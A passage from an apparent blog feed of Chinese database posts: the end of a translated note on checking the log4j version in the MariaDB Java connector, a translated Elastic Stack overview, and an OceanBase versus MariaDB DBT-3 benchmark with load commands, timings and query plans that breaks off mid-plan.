                      referrerpolicy="no-referrer"
                >
<p>如果由于某些原因你的项目不能编译，你也可以运行:</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">mvn help:effective-pom</span><br></pre></td></tr></table></figure></div>
<p>搜索 <code>log4j-core</code> 依赖项并检查使用的版本。</p>
<h2 id="更多信息">更多信息</h2>
<p>博客链接列表：</p>
<ul>
<li><a class="link"   href="https://mariadb.com/kb/en/about-mariadb-connector-j" >MariaDB Java 连接器 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="http://www.slf4j.org/" >SLF4j <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://mariadb.com/resources/blog/log4shell-and-mariadb-cve-2021-44228/" >Log4Shell 和 MariaDB 相关博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://logging.apache.org/log4j/2.x/security.html" >CVE-2021-44228 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://logging.apache.org/log4j/2.x/security.html" >Apache Log4j 安全漏洞 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://lists.apache.org/thread/d6v4r6nosxysyq9rvnr779336yf0woz4" >Apache Log4j 2.16.0 版本 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a href="https://mariadb.com/kb/en/about-mariadb-connector-j/#log-parameters"><code>log</code> 参数</a></li>
</ul>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/397951" >https://www.modb.pro/db/397951 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>MariaDB</category>
        <category>Translate</category>
      </categories>
      <tags>
        <tag>mariadb</tag>
        <tag>译文</tag>
        <tag>jdbc</tag>
        <tag>log4j</tag>
      </tags>
  </entry>
  <entry>
    <title>[译] 开始 Elastic (ELK) Stack 之旅</title>
    <url>/2022/modb/fanyi-elastic-stack-begining/</url>
    <content><![CDATA[<blockquote>
<p>原文链接：<a class="link"   href="https://blog.dbi-services.com/elastic-elk-stack-get-started/" >https://blog.dbi-services.com/elastic-elk-stack-get-started/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
原文作者：David Diab</p>
</blockquote>
<p>ELK Stack及其他组件最近被统称为Elastic Stack，这是三个开源项目的组合:Elasticsearch、Logstash和Kibana。所有这些项目都是由<a class="link"   href="https://www.elastic.co/" >Elastic <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>开发的，用于高效地存储、分析、发现和可视化数据！两年多以来，我有机会在Kubernetes上安装、配置和维护Elastic Stack。今天，我想和您分享Elastic Stack的快速启程之旅。</p>
<h2 id="Elastic-Stack-组件">Elastic Stack 组件</h2>
<h3 id="Elasticsearch">Elasticsearch</h3>
<p>事实上，一切都始于 Elasticsearch，对我来说，它是 Elastic Stack 的核心！它是一个高度可扩展的开源全文搜索和分析引擎。 它允许您几乎实时地存储和分析大量数据，无论是结构化的还是非结构化的文本、数字数据还是地理空间数据，Elasticsearch 都可以有效地存储和索引这些数据。</p>
<p>它提供了一个基于 Lucene StandardAnalyzer 的分布式系统，并应用于索引和基于 REST API 的 JSON 工具。</p>
<h3 id="Logstash">Logstash</h3>
<p>Logstash 是一个轻量级的、开源的、服务器端数据处理管道，它允许您从多种来源收集数据，动态地转换它们，并将它们发送到您的期望目的地。由于它与 Elasticsearch 紧密集成，具有强大的日志处理功能，所以 Logstash 是将数据加载到 Elasticsearch 的热门选择。</p>
<h3 id="Kibana">Kibana</h3>
<p>这是您进入 Stack 的入口！Kibana 是一款数据可视化和探索工具，用于日志和时间序列分析、应用监控和运营智能化。它提供了强大且易于使用的特性，如直方图、线形图、饼图、热力图和内置的地理空间支持。此外，它还提供了与 Elasticsearch 紧密集成的工具，一个流行的分析和搜索引擎，这使得 Kibana 成为数据可视化的默认选择，来展示存储在 Elasticserch 中的数据。</p>
<h3 id="Beats">Beats</h3>
<p>Beats 在2015年被引入到 Elastic Stack。它是一个轻量级、单一用途的数据传输程序家族，被称为 Beats。<br>
它们是客户端应用程序，将数据从数百上千台机器或容器发送到 Elasticsearch。<br>
Beats 家族由7个 Beat 组成：Filebeat, Metricbeat, Packetbeat, winlogbeat, Auditbeat, Heartbeat, Functionbeat。</p>
<p>我将在之后的文章中更深入地讨论每个组件，现在让我们理解所有这些组件是如何一起工作的。</p>
<h2 id="Elastic-Stack-架构">Elastic Stack 架构</h2>
<p>下面是 ELK Stack 的架构，展示了 ELK 内部层的正确顺序。这里，从各种来源 (Logstash 或 Beats) 生成的数据将根据提供的过滤条件被收集和处理。经过 Logstash 或 Beats 然后将数据传输到 Elasticsearch，然后进行分析和搜索。最后，在最外层，离用户最近的一层，您可以发现 Kibana 允许用户根据各自的需求进行可视化和管理数据。</p>
<img  alt="ELKStacke1640097724371.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220423-d6b7c1f2-60fd-4bd6-bac8-acafd061409e.png"
                      referrerpolicy="no-referrer"
                >
<p>图片来自：<a class="link"   href="https://www.elastic.co/elk-stack" >https://www.elastic.co/elk-stack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>这篇博客是对于 Elastic Stack 的概览，在之后的博客中，我将与您分享我是如何在 Kubernetes 安装和配置每个 Elastic Stack 组件的。同时，也欢迎您分享您的经验和用例，如果您没有任何经验，尽管试一试 Elastic Stack。</p>
<h2 id="译者注">译者注</h2>
<p><a class="link"   href="https://lucene.apache.org/core/4_0_0/analyzers-common/org/apache/lucene/analysis/standard/StandardAnalyzer.html" >Lucene StandardAnalyzer <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/397721" >https://www.modb.pro/db/397721 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Elastic</category>
      </categories>
      <tags>
        <tag>译文</tag>
        <tag>elastic</tag>
        <tag>elasticsearch</tag>
        <tag>apache</tag>
        <tag>elk</tag>
        <tag>kibana</tag>
        <tag>logstash</tag>
      </tags>
  </entry>
  <entry>
    <title>OB 测试 | 使用 DBT-3 对 OceanBase 和 MariaDB 进行性能测试对比</title>
    <url>/2022/oceanbase/ob-v3.1.3-perf-testing-with-dbt-3/</url>
    <content><![CDATA[<p>数据库的性能指标很多，性能测试的方法也很多，本文精选 DBT-3 中的6个 SQL 分别对 OceanBase 和 MariaDB 进行测试、对比。<br>
旨在发掘将 MariaDB 迁移到 OceanBase 之后，复杂查询的性能是否有显著提升，会提升多少。<br>
以及对比 OceanBase 在刚加载数据后，和触发合并后，执行复杂查询的运行时间差异。</p>
<img  alt="1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220421-cd711b62-538c-4d97-8f9a-730717ad3008.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="关于-OceanBase-社区版">关于 OceanBase 社区版</h2>
<p>OceanBase 数据库是一个金融级分布式关系数据库，提供社区版和企业版。<br>
OceanBase 数据库社区版，包含 OceanBase 的所有核心功能，源代码完全公开，且使用免费。<br>
OceanBase 数据库的 MySQL 模式兼容 MySQL 5.7 的绝大部分功能和语法，兼容 MySQL 5.7 版本的全量以及 8.0 版本的部分 JSON 函数。<br>
本文将使用 OceanBase 数据库社区版 v3.1.3 版本进行测试。</p>
<h2 id="关于-DBT-3">关于 DBT-3</h2>
<p>与TPC-H一样，DBT-3模拟了一个实际的决策支持系统，并为执行数据处理任务以做出更好的业务决策的复杂业务分析应用程序建模。<br>
通过运行DBT-3模拟的工作负载，可以在实际的决策支持系统中验证和度量性能。</p>
<img  alt="2.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220421-8cabd2c4-b054-49c5-8d8c-d5f4e4f2e5f9.jpg"
                      referrerpolicy="no-referrer"
                >
<h2 id="测试流程">测试流程</h2>
<p>测试环境与前问相同，再此不再赘述。下面直接开始进行场景测试。</p>
<p>本次测试，将从DBT-3的选择6个查询语句，分别在OceanBase和MariaDB上进行测试。<br>
分别统计基础数据加载的时间，SQL分别执行的时间。<br>
最后进行数据比对分析。</p>
<h3 id="DBT-3-数据加载时间对比">DBT-3 数据加载时间对比</h3>
<p>DBT-3 共包括8张测试表，及测试数据若干，首先需要将技术数据加载到数据库中。<br>
这个环节，我们可以观察 OB 和 MariaDB 两种数据库大批量数据导入的时间消耗。</p>
<p>使用 <code>LOAD DATA</code> 命令进行数据加载，这里需要注意的是，OB需要调整时间参数，以防数据加载时因超时中断。</p>
<p>超时报错举例如下：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">(root<span class="variable">@127</span><span class="number">.1</span>) [tpcc] <span class="number">15</span>:<span class="number">56</span>:<span class="number">22</span><span class="operator">&gt;</span> LOAD DATA INFILE <span class="string">&#x27;lineitem.tbl&#x27;</span> <span class="keyword">into</span> <span class="keyword">table</span> lineitem fields terminated <span class="keyword">by</span> <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">ERROR <span class="number">4012</span> (HY000): Timeout</span><br></pre></td></tr></table></figure></div>
<p>解决办法：<br>
导入数据时，如果出现超时告警，则可以通过调整参数<code>ob_query_timeout</code>的方式进行解决。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> tenant tpcc <span class="keyword">set</span> variables ob_query_timeout<span class="operator">=</span><span class="number">10000000</span>;</span><br></pre></td></tr></table></figure></div>
<p>需要<a class="link"   href="https://open.oceanbase.com/docs/observer-cn/V3.1.3/10000000000096612#title-h7u-4l6-3xz" >重启集群 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>才能生效。</p>
<p>数据加载具体命令如下：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">LOAD DATA INFILE <span class="string">&#x27;customer.tbl&#x27;</span> <span class="keyword">into</span> <span class="keyword">table</span> customer fields terminated <span class="keyword">by</span> <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">LOAD DATA INFILE <span class="string">&#x27;lineitem.tbl&#x27;</span> <span class="keyword">into</span> <span class="keyword">table</span> lineitem fields terminated <span class="keyword">by</span> <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">LOAD DATA INFILE <span class="string">&#x27;nation.tbl&#x27;</span> <span class="keyword">into</span> <span class="keyword">table</span> nation fields terminated <span class="keyword">by</span> <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">LOAD DATA INFILE <span class="string">&#x27;orders.tbl&#x27;</span> <span class="keyword">into</span> <span class="keyword">table</span> orders fields terminated <span class="keyword">by</span> <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">LOAD DATA INFILE <span class="string">&#x27;part.tbl&#x27;</span> <span class="keyword">into</span> <span class="keyword">table</span> part fields terminated <span class="keyword">by</span> <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">LOAD DATA INFILE <span class="string">&#x27;partsupp.tbl&#x27;</span> <span class="keyword">into</span> <span class="keyword">table</span> partsupp fields terminated <span class="keyword">by</span> <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">LOAD DATA INFILE <span class="string">&#x27;region.tbl&#x27;</span> <span class="keyword">into</span> <span class="keyword">table</span> region fields terminated <span class="keyword">by</span> <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">LOAD DATA INFILE <span class="string">&#x27;supplier.tbl&#x27;</span> <span class="keyword">into</span> <span class="keyword">table</span> supplier fields terminated <span class="keyword">by</span> <span class="string">&#x27;|&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
<p>跳过加载过程，我们直接来看数据加载的耗时数据，记录表第一列为序号，第二列为表名，第三列为该表数据行数，第四列表示在OB的加载时长，第五列表示在MariaDB中的加载时长。具体数据如下表所示。</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>Table</th>
<th>Rows</th>
<th>OceanBase</th>
<th>MariaDB</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>customer</td>
<td>150000</td>
<td>2.844 sec</td>
<td>1.71 sec</td>
</tr>
<tr>
<td>2</td>
<td>lineitem</td>
<td>6001215</td>
<td>1 min 51.156 sec</td>
<td>49.84 sec</td>
</tr>
<tr>
<td>3</td>
<td>nation</td>
<td>25</td>
<td>0.034 sec</td>
<td>0.06 sec</td>
</tr>
<tr>
<td>4</td>
<td>orders</td>
<td>1500000</td>
<td>25.971 sec</td>
<td>11.09 sec</td>
</tr>
<tr>
<td>5</td>
<td>part</td>
<td>200000</td>
<td>3.526 sec</td>
<td>2.69 sec</td>
</tr>
<tr>
<td>6</td>
<td>partsupp</td>
<td>800000</td>
<td>10.309 sec</td>
<td>20.25 sec</td>
</tr>
<tr>
<td>7</td>
<td>region</td>
<td>5</td>
<td>0.025 sec</td>
<td>0.08 sec</td>
</tr>
<tr>
<td>8</td>
<td>supplier</td>
<td>10000</td>
<td>0.279 sec</td>
<td>0.42 sec</td>
</tr>
</tbody>
</table>
<p>这里需要说明的是，如果加载数据时不指定并行，OB会使用默认设定（<code>/*+ parallel(4) */</code>），实际使用时，可依据租户被分配的最大CPU进行调整。</p>
<h3 id="DBT-3-SQL-运行时间对比">DBT-3 SQL 运行时间对比</h3>
<p>下面将分别在OceanBase和MariaDB逐一执行6个SQL，并记录运行时间。</p>
<p>由于篇幅有限，这里只记录了重要的OB中的执行计划。</p>
<h3 id="SQL-1-执行计划">SQL-1 执行计划</h3>
<p><a class="link"   href="https://mariadb.com/kb/en/dbt3-benchmark-queries/#q1" >SQL 1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 比较简单，只涉及一张表 <code>lineitem</code>, 分组查询和排序的字段，其数据类型都是<code>char(1)</code>，影响执行时间的主要因素是过滤条件<code>l_shipdate &lt;= date_sub('1998-12-01', interval '79' day)</code>需要进行全表扫描。</p>
<ul>
<li>一般情况下的执行计划：</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">Query Plan: <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="operator">|</span>ID<span class="operator">|</span>OPERATOR      <span class="operator">|</span>NAME    <span class="operator">|</span>EST. <span class="keyword">ROWS</span><span class="operator">|</span>COST   <span class="operator">|</span></span><br><span class="line"><span class="comment">----------------------------------------------</span></span><br><span class="line"><span class="operator">|</span><span class="number">0</span> <span class="operator">|</span>SORT          <span class="operator">|</span>        <span class="operator">|</span><span class="number">10001</span>    <span class="operator">|</span><span class="number">6820793</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">1</span> <span class="operator">|</span> HASH <span class="keyword">GROUP</span> <span class="keyword">BY</span><span class="operator">|</span>        <span class="operator">|</span><span class="number">10001</span>    <span class="operator">|</span><span class="number">6742539</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">2</span> <span class="operator">|</span>  <span class="keyword">TABLE</span> SCAN  <span class="operator">|</span>lineitem<span class="operator">|</span><span class="number">2000405</span>  <span class="operator">|</span><span class="number">5008428</span><span class="operator">|</span></span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"></span><br><span class="line">Outputs <span class="operator">&amp;</span> filters:</span><br><span class="line"><span class="comment">-------------------------------------</span></span><br><span class="line">  <span class="number">0</span> <span class="operator">-</span> output([lineitem.l_returnflag], [lineitem.l_linestatus], [T_FUN_SUM(lineitem.l_quantity)], [T_FUN_SUM(lineitem.l_extendedprice)], [T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)], [T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount <span class="operator">*</span> ? <span class="operator">+</span> lineitem.l_tax)], [T_FUN_SUM(lineitem.l_quantity) <span class="operator">/</span> <span class="built_in">cast</span>(T_FUN_COUNT(lineitem.l_quantity), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>))], [T_FUN_SUM(lineitem.l_extendedprice) <span class="operator">/</span> <span class="built_in">cast</span>(T_FUN_COUNT(lineitem.l_extendedprice), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>))], [T_FUN_SUM(lineitem.l_discount) <span class="operator">/</span> <span class="built_in">cast</span>(T_FUN_COUNT(lineitem.l_discount), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>))], [T_FUN_COUNT(<span class="operator">*</span>)]), <span class="keyword">filter</span>(nil), sort_keys([lineitem.l_returnflag, <span class="keyword">ASC</span>], [lineitem.l_linestatus, <span class="keyword">ASC</span>])</span><br><span class="line">  <span class="number">1</span> <span class="operator">-</span> output([lineitem.l_returnflag], [lineitem.l_linestatus], [T_FUN_SUM(lineitem.l_quantity)], [T_FUN_SUM(lineitem.l_extendedprice)], [T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)], [T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount <span class="operator">*</span> ? <span class="operator">+</span> lineitem.l_tax)], [T_FUN_COUNT(lineitem.l_quantity)], [T_FUN_COUNT(lineitem.l_extendedprice)], [T_FUN_SUM(lineitem.l_discount)], [T_FUN_COUNT(lineitem.l_discount)], [T_FUN_COUNT(<span class="operator">*</span>)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      <span class="keyword">group</span>([lineitem.l_returnflag], [lineitem.l_linestatus]), agg_func([T_FUN_SUM(lineitem.l_quantity)], [T_FUN_SUM(lineitem.l_extendedprice)], [T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)], [T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount <span class="operator">*</span> ? <span class="operator">+</span> lineitem.l_tax)], [T_FUN_COUNT(<span class="operator">*</span>)], [T_FUN_COUNT(lineitem.l_quantity)], [T_FUN_COUNT(lineitem.l_extendedprice)], [T_FUN_SUM(lineitem.l_discount)], [T_FUN_COUNT(lineitem.l_discount)])</span><br><span class="line">  <span class="number">2</span> <span class="operator">-</span> output([lineitem.l_returnflag], [lineitem.l_linestatus], [lineitem.l_quantity], [lineitem.l_extendedprice], [lineitem.l_discount], [lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount], [lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount <span class="operator">*</span> ? <span class="operator">+</span> lineitem.l_tax]), <span class="keyword">filter</span>([<span class="built_in">cast</span>(lineitem.l_shipDATE, DATETIME(<span class="number">-1</span>, <span class="number">-1</span>)) <span class="operator">&lt;=</span> ?]),</span><br><span class="line">      access([lineitem.l_shipDATE], [lineitem.l_returnflag], [lineitem.l_linestatus], [lineitem.l_quantity], [lineitem.l_extendedprice], [lineitem.l_discount], [lineitem.l_tax]), partitions(p0)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.006</span> sec)</span><br></pre></td></tr></table></figure></div>
<ul>
<li>转储合并后的执行计划：</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">Query Plan: <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="operator">|</span>ID<span class="operator">|</span>OPERATOR      <span class="operator">|</span>NAME    <span class="operator">|</span>EST. <span class="keyword">ROWS</span><span class="operator">|</span>COST   <span class="operator">|</span></span><br><span class="line"><span class="comment">----------------------------------------------</span></span><br><span class="line"><span class="operator">|</span><span class="number">0</span> <span class="operator">|</span>SORT          <span class="operator">|</span>        <span class="operator">|</span><span class="number">6</span>        <span class="operator">|</span><span class="number">4988325</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">1</span> <span class="operator">|</span> HASH <span class="keyword">GROUP</span> <span class="keyword">BY</span><span class="operator">|</span>        <span class="operator">|</span><span class="number">6</span>        <span class="operator">|</span><span class="number">4988308</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">2</span> <span class="operator">|</span>  <span class="keyword">TABLE</span> SCAN  <span class="operator">|</span>lineitem<span class="operator">|</span><span class="number">2000405</span>  <span class="operator">|</span><span class="number">3261350</span><span class="operator">|</span></span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"></span><br><span class="line">Outputs <span class="operator">&amp;</span> filters:</span><br><span class="line"><span class="comment">-------------------------------------</span></span><br><span class="line">  <span class="number">0</span> <span class="operator">-</span> output([lineitem.l_returnflag], [lineitem.l_linestatus], [T_FUN_SUM(lineitem.l_quantity)], [T_FUN_SUM(lineitem.l_extendedprice)], [T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)], [T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount <span class="operator">*</span> ? <span class="operator">+</span> lineitem.l_tax)], [T_FUN_SUM(lineitem.l_quantity) <span class="operator">/</span> <span class="built_in">cast</span>(T_FUN_COUNT(lineitem.l_quantity), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>))], [T_FUN_SUM(lineitem.l_extendedprice) <span class="operator">/</span> <span class="built_in">cast</span>(T_FUN_COUNT(lineitem.l_extendedprice), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>))], [T_FUN_SUM(lineitem.l_discount) <span class="operator">/</span> <span class="built_in">cast</span>(T_FUN_COUNT(lineitem.l_discount), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>))], [T_FUN_COUNT(<span class="operator">*</span>)]), <span class="keyword">filter</span>(nil), sort_keys([lineitem.l_returnflag, <span class="keyword">ASC</span>], [lineitem.l_linestatus, <span class="keyword">ASC</span>])</span><br><span class="line">  <span class="number">1</span> <span class="operator">-</span> output([lineitem.l_returnflag], [lineitem.l_linestatus], [T_FUN_SUM(lineitem.l_quantity)], [T_FUN_SUM(lineitem.l_extendedprice)], [T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)], [T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount <span class="operator">*</span> ? <span class="operator">+</span> lineitem.l_tax)], [T_FUN_COUNT(lineitem.l_quantity)], [T_FUN_COUNT(lineitem.l_extendedprice)], [T_FUN_SUM(lineitem.l_discount)], [T_FUN_COUNT(lineitem.l_discount)], [T_FUN_COUNT(<span class="operator">*</span>)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      <span class="keyword">group</span>([lineitem.l_returnflag], [lineitem.l_linestatus]), agg_func([T_FUN_SUM(lineitem.l_quantity)], [T_FUN_SUM(lineitem.l_extendedprice)], [T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)], [T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount <span class="operator">*</span> ? <span class="operator">+</span> lineitem.l_tax)], [T_FUN_COUNT(<span class="operator">*</span>)], [T_FUN_COUNT(lineitem.l_quantity)], [T_FUN_COUNT(lineitem.l_extendedprice)], [T_FUN_SUM(lineitem.l_discount)], [T_FUN_COUNT(lineitem.l_discount)])</span><br><span class="line">  <span class="number">2</span> <span class="operator">-</span> output([lineitem.l_returnflag], 